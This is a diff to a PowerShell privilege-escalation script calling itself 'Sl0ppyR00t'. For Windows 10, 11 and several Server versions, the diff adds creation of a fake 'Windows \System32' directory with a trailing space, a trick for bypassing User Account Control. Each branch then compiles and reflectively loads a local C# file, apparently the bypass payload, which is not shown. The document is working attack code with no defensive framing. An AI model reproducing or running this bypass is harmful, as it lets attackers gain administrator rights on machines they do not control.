@@ -31,6 +31,8 @@ switch ($OSVersion)
 	    Write-Host " 00000000000000000000000000000000000000"
         Write-Host " 0 Sl0ppyR00t says it's a Windows 10! 0"
 	    Write-Host " 00000000000000000000000000000000000000"
+		New-Item "\\?\C:\Windows-sl0ppy \System32" -ItemType Directory
+		
         Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
 
         [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
@@ -124,7 +126,9 @@ switch ($OSVersion)
 	    Write-Host " 000000000000000000000000000000000000000000000000"
         Write-Host " 0 Sl0ppyR00t says it's a Windows Server 20919! 0"
 	    Write-Host " 000000000000000000000000000000000000000000000000"
-        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
+        New-Item "\\?\C:\Windows-sl0ppy \System32" -ItemType Directory
+		
+		Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
 
         [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
 
@@ -217,7 +221,9 @@ switch ($OSVersion)
 	    Write-Host " 00000000000000000000000000000000000000"
         Write-Host " 0 Sl0ppyR00t says it's a Windows 11! 0"
 	    Write-Host " 00000000000000000000000000000000000000"
-        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
+        New-Item "\\?\C:\Windows-sl0ppy \System32" -ItemType Directory
+		
+		Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
 
         [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
 
@@ -310,7 +316,9 @@ switch ($OSVersion)
 	    Write-Host " 00000000000000000000000000000000000000000000000"
         Write-Host " 0 Sl0ppyR00t says it's a Windows Server 2022! 0"
         Write-Host " 00000000000000000000000000000000000000000000000"
-        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
+        New-Item "\\?\C:\Windows-sl0ppy \System32" -ItemType Directory
+		
+		Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
 
         [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
 
